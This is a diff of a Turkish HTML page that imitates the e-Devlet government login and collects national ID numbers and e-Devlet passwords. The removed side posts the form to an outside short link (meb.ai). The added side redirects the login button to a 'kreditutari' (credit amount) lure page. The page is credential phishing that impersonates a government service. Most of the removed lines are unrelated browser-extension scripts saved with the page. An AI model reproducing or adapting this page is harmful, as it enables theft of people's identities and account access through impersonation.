@@ -1,315 +1,5 @@
-<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_XTBToo"></div><script>
-    window[Symbol.for('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')] = new (class PostClient {
-    constructor(name, destination) {
-        this.name = name;
-        this.destination = destination;
-        this.serverListeners = {};
-        this.bgRequestsListeners = {};
-        this.bgEventsListeners = {};
-        window.addEventListener('message', (message) => {
-            const data = message.data;
-            const isNotForMe = !(data.destination && data.destination === this.name);
-            const hasNotEventProp = !data.event;
-            if (isNotForMe || hasNotEventProp) {
-                return;
-            }
-            if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
-                const response = data.args;
-                if (this.hasBgRequestListener(response.requestId)) {
-                    try {
-                        this.bgRequestsListeners[response.requestId](response.response);
-                    }
-                    catch (e) {
-                        console.log(e);
-                    }
-                    delete this.bgRequestsListeners[response.requestId];
-                }
-            }
-            else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
-                const response = data.args;
-                if (this.hasBgEventListener(response.event)) {
-                    try {
-                        this.bgEventsListeners[data.id](response.payload);
-                    }
-                    catch (e) {
-                        console.log(e);
-                    }
-                }
-            }
-            else if (this.hasServerListener(data.event)) {
-                try {
-                    this.serverListeners[data.event](data.args);
-                }
-                catch (e) {
-                    console.log(e);
-                }
-            }
-            else {
-                console.log(`event not handled: ${data.event}`);
-            }
-        });
-    }
-    emitToServer(event, args) {
-        const id = this.generateUIID();
-        const message = {
-            args,
-            destination: this.destination,
-            event,
-            id,
-        };
-        window.postMessage(message, location.origin);
-        return id;
-    }
-    emitToBg(bgEventName, args) {
-        const requestId = this.generateUIID();
-        const request = { bgEventName, requestId, args };
-        this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
-        return requestId;
-    }
-    hasServerListener(event) {
-        return !!this.serverListeners[event];
-    }
-    hasBgRequestListener(requestId) {
-        return !!this.bgRequestsListeners[requestId];
-    }
-    hasBgEventListener(bgEventName) {
-        return !!this.bgEventsListeners[bgEventName];
-    }
-    fromServerEvent(event, listener) {
-        this.serverListeners[event] = listener;
-    }
-    fromBgEvent(bgEventName, listener) {
-        this.bgEventsListeners[bgEventName] = listener;
-    }
-    fromBgResponse(requestId, listener) {
-        this.bgRequestsListeners[requestId] = listener;
-    }
-    generateUIID() {
-        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
-            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
-            return v.toString(16);
-        });
-    }
-})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon', 'MARIO_POST_SERVER_eppiocemhmnlbhjplcgkofciiegomcon')</script><script>
-    const hideMyLocation = new (class HideMyLocation {
-    constructor(clientKey) {
-        this.clientKey = clientKey;
-        this.watchIDs = {};
-        this.client = window[Symbol.for(clientKey)];
-        const getCurrentPosition = navigator.geolocation.getCurrentPosition;
-        const watchPosition = navigator.geolocation.watchPosition;
-        const clearWatch = navigator.geolocation.clearWatch;
-        const self = this;
-        navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
-            self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
-        };
-        navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
-            return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
-        };
-        navigator.geolocation.clearWatch = function (fakeWatchId) {
-            if (fakeWatchId === -1) {
-                return;
-            }
-            const realWatchId = self.watchIDs[fakeWatchId];
-            delete self.watchIDs[fakeWatchId];
-            return clearWatch.apply(this, [realWatchId]);
-        };
-    }
-    handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
-        const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
-        let fakeWatchId = this.getRandomInt(0, 100000);
-        this.client.fromBgResponse(requestId, (response) => {
-            if (response.enabled) {
-                if (response.status === 'SUCCESS') {
-                    const position = this.map(response);
-                    successCallback(position);
-                }
-                else {
-                    const error = this.errorObj();
-                    errorCallback(error);
-                    fakeWatchId = -1;
-                }
-            }
-            else {
-                const args = [successCallback, errorCallback, options];
-                const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
-                if (type === 'WATCH') {
-                    this.watchIDs[fakeWatchId] = watchId;
-                }
-            }
-        });
-        if (type === 'WATCH') {
-            return fakeWatchId;
-        }
-    }
-    map(response) {
-        return {
-            coords: {
-                accuracy: 20,
-                altitude: null,
-                altitudeAccuracy: null,
-                heading: null,
-                latitude: response.latitude,
-                longitude: response.longitude,
-                speed: null,
-            },
-            timestamp: Date.now(),
-        };
-    }
-    errorObj() {
-        return {
-            code: 1,
-            message: 'User denied Geolocation',
-        };
-    }
-    getRandomInt(min, max) {
-        min = Math.ceil(min);
-        max = Math.floor(max);
-        return Math.floor(Math.random() * (max - min + 1)) + min;
-    }
-})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')
-  </script><head><script>(function(){function hookGeo() {
-  //<![CDATA[
-  const WAIT_TIME = 100;
-  const hookedObj = {
-    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
-    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
-    fakeGeo: true,
-    genLat: 38.883333,
-    genLon: -77.000
-  };
 
-  function waitGetCurrentPosition() {
-    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
-      if (hookedObj.fakeGeo === true) {
-        hookedObj.tmp_successCallback({
-          coords: {
-            latitude: hookedObj.genLat,
-            longitude: hookedObj.genLon,
-            accuracy: 10,
-            altitude: null,
-            altitudeAccuracy: null,
-            heading: null,
-            speed: null,
-          },
-          timestamp: new Date().getTime(),
-        });
-      } else {
-        hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
-      }
-    } else {
-      setTimeout(waitGetCurrentPosition, WAIT_TIME);
-    }
-  }
-
-  function waitWatchPosition() {
-    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
-      if (hookedObj.fakeGeo === true) {
-        navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
-        return Math.floor(Math.random() * 10000); // random id
-      } else {
-        hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
-      }
-    } else {
-      setTimeout(waitWatchPosition, WAIT_TIME);
-    }
-  }
-
-  Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
-    hookedObj.tmp_successCallback = successCallback;
-    hookedObj.tmp_errorCallback = errorCallback;
-    hookedObj.tmp_options = options;
-    waitGetCurrentPosition();
-  };
-  Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
-    hookedObj.tmp2_successCallback = successCallback;
-    hookedObj.tmp2_errorCallback = errorCallback;
-    hookedObj.tmp2_options = options;
-    waitWatchPosition();
-  };
-
-  const instantiate = (constructor, args) => {
-    const bind = Function.bind;
-    const unbind = bind.bind(bind);
-    return new (unbind(constructor, null).apply(null, args));
-  }
-
-  Blob = function (_Blob) {
-    function secureBlob(...args) {
-      const injectableMimeTypes = [
-        { mime: 'text/html', useXMLparser: false },
-        { mime: 'application/xhtml+xml', useXMLparser: true },
-        { mime: 'text/xml', useXMLparser: true },
-        { mime: 'application/xml', useXMLparser: true },
-        { mime: 'image/svg+xml', useXMLparser: true },
-      ];
-      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
-
-      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
-        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
-        if (mimeTypeIndex >= 0) {
-          let mimeType = injectableMimeTypes[mimeTypeIndex];
-          let injectedCode = `<script>(
-            ${hookGeo}
-          )();<\/script>`;
-    
-          let parser = new DOMParser();
-          let xmlDoc;
-          if (mimeType.useXMLparser === true) {
-            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
-          } else {
-            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
-          }
-
-          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
-            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
-    
-            if (mimeType.useXMLparser === true) {
-              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
-            } else {
-              args[0][0] = xmlDoc.documentElement.outerHTML;
-            }
-          }
-        }
-      }
-
-      return instantiate(_Blob, args); // arguments?
-    }
-
-    // Copy props and methods
-    let propNames = Object.getOwnPropertyNames(_Blob);
-    for (let i = 0; i < propNames.length; i++) {
-      let propName = propNames[i];
-      if (propName in secureBlob) {
-        continue; // Skip already existing props
-      }
-      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
-      Object.defineProperty(secureBlob, propName, desc);
-    }
-
-    secureBlob.prototype = _Blob.prototype;
-    return secureBlob;
-  }(Blob);
-
-  window.addEventListener('message', function (event) {
-    if (event.source !== window) {
-      return;
-    }
-    const message = event.data;
-    switch (message.method) {
-      case 'updateLocation':
-        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
-          hookedObj.genLat = message.info.coords.lat;
-          hookedObj.genLon = message.info.coords.lon;
-          hookedObj.fakeGeo = message.info.fakeIt;
-        }
-        break;
-      default:
-        break;
-    }
-  }, false);
-  //]]>
-}hookGeo();})()</script>
+<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="IE=edge">
@@ -325,34 +15,7 @@
     <link rel="icon" type="image/png" href="assets/img/favicon-196x196.png" sizes="196x196">
     <meta name="msapplication-TileColor" content="#FFFFFF">
     <link rel="stylesheet" href="assets/css/base.css">
-    <script src="assets/js/header.js"></script><script ecommerce-type="extend-native-history-api">(() => {
-            const nativePushState = history.pushState;
-            const nativeReplaceState = history.replaceState;
-            const nativeBack = history.back;
-            const nativeForward = history.forward;
-            function emitUrlChanged() {
-                const message = {
-                    _custom_type_: 'CUSTOM_ON_URL_CHANGED',
-                };
-                window.postMessage(message);
-            }
-            history.pushState = function () {
-                nativePushState.apply(history, arguments);
-                emitUrlChanged();
-            };
-            history.replaceState = function () {
-                nativeReplaceState.apply(history, arguments);
-                emitUrlChanged();
-            };
-            history.back = function () {
-                nativeBack.apply(history, arguments);
-                emitUrlChanged();
-            };
-            history.forward = function () {
-                nativeForward.apply(history, arguments);
-                emitUrlChanged();
-            };
-        })()</script>
+    <script src="assets/js/header.js"></script>
     <link rel="stylesheet" href="assets/css/giris.css">
 
     <style>
@@ -362,7 +25,7 @@
             
         }
     </style>
-<style type="text/css">@font-face { font-family: Roboto; src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf"); }</style></head>
+</head>
 
 <body data-lang="null">
 <div id="page">
@@ -395,12 +58,12 @@
                 T.C. Kimlik Numaranızı ve e-Devlet sifrenizi kullanarak kimliğiniz doğrulandıktan sonra isleminize kaldığınız yerden devam edebilirsiniz.
 
              
-                
+                </a>
 
             </div>
             
             
-            <form method="post" id="loginForm" action="https://meb.ai/N3Cje8" name="sifreGirisForm" autocomplete="off">
+            <form method="post" id="loginForm" action="" name="sifreGirisForm" autocomplete="off">
                 <fieldset>
                     <div class="formRow required ">
                         
@@ -411,7 +74,7 @@
                             <input name="tridField" type="text" class="text" id="tridField" value="" tabindex="1" autocomplete="off" maxlength="11" pattern="[0-9]{11}" title="Kimlik numaranız 11 adet rakamdan olusmalıdır" aria-required="true" required="">
                             <span class="virtual-key-wrapper">
              
-                                
+                                </a>
                             </span>
                         </div>
                     </div>
@@ -424,7 +87,7 @@
                             <input type="hidden" name="encEgpField" id="encEgpField" value="">
                             
                             <span class="virtual-key-wrapper">
-                                
+                                </a>
                                 </span>
                             
                             <div class="capsWarning">
@@ -433,7 +96,7 @@
                             </div>
                             <div class="fieldInfo richText">
                                 * e-Devlet
-                                
+                                </a>
                                 doğruladığınız cep telefonunuzdan yenileme islemi yapabilirsiniz.<br>
                             </div>
                         </div>
@@ -447,7 +110,7 @@
                     <input type="hidden" name="actionName" value="giris">
                     <input type="hidden" name="jsonData" id="jsonData" value="">
                    
-  <a class="submitButton" href="./kreditutari.html">Giriş</a>
+  <input class="submitButton" name="submitButton" type="button" onclick="location.href='./kreditutari';" tabindex="3" value="Giris Yap" onclick="submitForm(event)">
   
 
   
@@ -671,247 +334,4 @@ function gonder(){
 </script>
 
 
-<div id="facebox" style="display:none" role="dialog"><div class="body"><a class="visuallyhidden" id="popAnchor">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a><div id="modalContent" class="content"></div></div></div>
-<script>
-		function returnCommentSymbol(language = "javascript") {
-			const languageObject = {
-				bat: "@REM",
-				c: "//",
-				csharp: "//",
-				cpp: "//",
-				closure: ";;",
-				coffeescript: "#",
-				dockercompose: "#",
-				css: "/*DELIMITER*/",
-				"cuda-cpp": "//",
-				dart: "//",
-				diff: "#",
-				dockerfile: "#",
-				fsharp: "//",
-				"git-commit": "//",
-				"git-rebase": "#",
-				go: "//",
-				groovy: "//",
-				handlebars: "{{!--DELIMITER--}}",
-				hlsl: "//",
-				html: "<!--DELIMITER-->",
-				ignore: "#",
-				ini: ";",
-				java: "//",
-				javascript: "//",
-				javascriptreact: "//",
-				json: "//",
-				jsonc: "//",
-				julia: "#",
-				latex: "%",
-				less: "//",
-				lua: "--",
-				makefile: "#",
-				markdown: "<!--DELIMITER-->",
-				"objective-c": "//",
-				"objective-cpp": "//",
-				perl: "#",
-				perl6: "#",
-				php: "<!--DELIMITER-->",
-				powershell: "#",
-				properties: ";",
-				jade: "//-",
-				python: "#",
-				r: "#",
-				razor: "<!--DELIMITER-->",
-				restructuredtext: "..",
-				ruby: "#",
-				rust: "//",
-				scss: "//",
-				shaderlab: "//",
-				shellscript: "#",
-				sql: "--",
-				svg: "<!--DELIMITER-->",
-				swift: "//",
-				tex: "%",
-				typescript: "//",
-				typescriptreact: "//",
-				vb: "'",
-				xml: "<!--DELIMITER-->",
-				xsl: "<!--DELIMITER-->",
-				yaml: "#"
-			}
-			if(!languageObject[language]){
-				return languageObject["python"].split("DELIMITER")
-			}
-			return languageObject[language].split("DELIMITER")
-		}
-		var savedChPos = 0
-		var returnedSuggestion = ''
-		let editor, doc, cursor, line, pos
-		pos = {line: 0, ch: 0}
-		var suggestionsStatus = false
-		var docLang = "python"
-		var suggestionDisplayed = false
-		var isReturningSuggestion = false
-		document.addEventListener("keydown", (event) => {
-		setTimeout(()=>{
-			editor = event.target.closest('.CodeMirror');
-			if (editor){
-				const codeEditor = editor.CodeMirror
-				if(!editor.classList.contains("added-tab-function")){
-					editor.classList.add("added-tab-function")
-					codeEditor.removeKeyMap("Tab")
-					codeEditor.setOption("extraKeys", {Tab: (cm)=>{
-
-						if(returnedSuggestion){
-							acceptTab(returnedSuggestion)
-						}
-						else{
-							cm.execCommand("defaultTab")
-						}
-					}})
-				}
-				doc = editor.CodeMirror.getDoc()
-				cursor = doc.getCursor()
-				line = doc.getLine(cursor.line)
-				pos = {line: cursor.line, ch: line.length}
-
-				if(cursor.ch > 0){
-					savedChPos = cursor.ch
-				}
-
-				const fileLang = doc.getMode().name
-				docLang = fileLang
-				const commentSymbol = returnCommentSymbol(fileLang)
-				if (event.key == "?"){
-					var lastLine = line
-					lastLine = lastLine.slice(0, savedChPos - 1)
-
-					if(lastLine.trim().startsWith(commentSymbol[0])){
-						if(fileLang !== "null"){
-							lastLine += " "+ fileLang
-						}
-						
-						lastLine = lastLine.split(commentSymbol[0])[1]
-						window.postMessage({source: 'getQuery', payload: { data: lastLine } } )
-						isReturningSuggestion = true
-						displayGrey("\nBlackbox loading...")
-					}
-				}else if(event.key === "Enter" && suggestionsStatus && !isReturningSuggestion){
-					var query = doc.getRange({ line: Math.max(0,cursor.line-50), ch: 0 }, { line: cursor.line, ch: line.length })
-					window.postMessage({source: 'getSuggestion', payload: { data: query, language: docLang, cursorPos: pos } } )
-					displayGrey("Blackbox loading...")
-				}else if(event.key === "ArrowRight" && returnedSuggestion){
-					acceptTab(returnedSuggestion)
-				}else if(event.key === "Enter" && isReturningSuggestion){
-					displayGrey("\nBlackbox loading...")
-				}else if(event.key === "Escape"){
-					displayGrey("")
-				}
-			}
-		}, 0)
-		})
-
-		function acceptTab(text){
-		if (suggestionDisplayed){
-			displayGrey("")
-			doc.replaceRange(text, pos)
-			returnedSuggestion = ""
-			updateSuggestionStatus(false)
-		}
-		}
-		function acceptSuggestion(text){
-			displayGrey("")
-			doc.replaceRange(text, pos)
-			returnedSuggestion = ""
-			updateSuggestionStatus(false)
-		}
-		function displayGrey(text){
-			if(!text){
-				document.querySelector(".blackbox-suggestion").remove()
-				return
-			}
-			var el = document.querySelector(".blackbox-suggestion")
-			if(!el){
-				el = document.createElement('span')
-				el.classList.add("blackbox-suggestion")
-				el.style = 'color:grey'
-				el.innerText = text
-			}
-			else{
-				el.innerText = text
-			}
-			
-			var lineIndex = pos.line;
-			editor.getElementsByClassName('CodeMirror-line')[lineIndex].appendChild(el)
-		}
-		function updateSuggestionStatus(s){
-			suggestionDisplayed = s
-			window.postMessage({source: 'updateSuggestionStatus', status: suggestionDisplayed, suggestion: returnedSuggestion})
-		}
-		window.addEventListener('message', (event)=>{
-		if (event.source !== window ) return
-		if (event.data.source == 'return'){
-			isReturningSuggestion = false
-			const formattedCode = formatCode(event.data.payload.data)
-			returnedSuggestion = formattedCode
-			displayGrey(formattedCode)
-			updateSuggestionStatus(true)
-		}
-		if(event.data.source == 'suggestReturn'){
-			const prePos = event.data.payload.cursorPos
-			if(pos.line == prePos.line && pos.ch == prePos.ch){
-				returnedSuggestion = event.data.payload.data
-				displayGrey(event.data.payload.data)
-				updateSuggestionStatus(true)
-			}
-			else{
-				displayGrey()
-			}
-		}
-		if(event.data.source == 'codeSearchReturn'){
-			isReturningSuggestion = false
-			displayGrey()
-		}
-		if(event.data.source == 'suggestionsStatus'){
-			suggestionsStatus = event.data.payload.enabled
-		}
-		if(event.data.source == 'acceptSuggestion'){
-			
-			acceptSuggestion(event.data.suggestion)
-		}
-		})
-		document.addEventListener("keyup", function(){
-			returnedSuggestion = ""
-			updateSuggestionStatus(false)
-		})
-		function formatCode(data) {
-			if (Array.isArray(data)) {
-				var finalCode = ""
-				var pairs = []
-		
-				const commentSymbol = returnCommentSymbol(docLang)
-				data.forEach((codeArr, idx) => {
-					const code = codeArr[0]
-					var desc = codeArr[1]
-					const descArr = desc.split("\n")
-					var finalDesc = ""
-					descArr.forEach((descLine, idx) => {
-						const whiteSpace = descLine.search(/\S/)
-						if (commentSymbol.length < 2 || idx === 0) {
-							finalDesc += insert(descLine, whiteSpace, commentSymbol[0])
-						}
-						if (commentSymbol.length > 1 && idx === descArr.length - 1) {
-							finalDesc = finalDesc + commentSymbol[1] + "\n"
-						}
-					})
-		
-					finalCode += finalDesc + "\n\n" + code
-					pairs.push(finalCode)
-				})
-				return "\n"+pairs.join("\n")
-			}
-		
-			return "\n"+data
-		}
-		
-		function insert(str, index, value) {
-			return str.substr(0, index) + value + str.substr(index)
-		}
-	</script></body></html>
+<div id="facebox" style="display:none" role="dialog"><div class="body"><a class="visuallyhidden" id="popAnchor">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a><div id="modalContent" class="content"></div></div></div></body></html>
